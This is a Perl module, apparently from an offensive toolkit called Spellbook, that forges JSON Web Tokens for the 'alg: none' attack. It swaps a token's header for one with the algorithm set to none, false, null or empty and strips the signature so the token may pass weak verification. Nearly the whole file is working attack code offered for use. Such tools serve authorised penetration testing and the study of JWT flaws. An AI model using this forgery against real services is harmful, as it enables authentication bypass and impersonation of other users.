package Spellbook::Exploit::None_Attack {
    use strict;
    use warnings;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $token, $attack, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"   => \$help,
            "token=s"  => \$token,
            "attack=s" => \$attack
        );

        if ($token) {
            my $attacks = {
                none  => "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
                false => "eyJhbGciOmZhbHNlLCJ0eXAiOiJKV1QifQ",
                null  => "eyJhbGciOm51bGwsInR5cCI6IkpXVCJ9",
                empty => "eyJhbGciOiIiLCJ0eXAiOiJKV1QifQ"
            };
            
            my ($header_b64, $payload_b64, $signature_b64) = split(/\./x, $token);

            push @result, $attacks -> {$attack} . "." . $payload_b64 . ".";
            
            return @result;
        }

        if ($help) {
            return "
                \rExploit::None_Attack
                \r=====================
                \r-h, --help     See this menu
                \r--token        Define a token to perform attacks
                \r--attack       Options avaiable: none, false, null and empty\n\n";
        }

        return 0;
    }
}

1;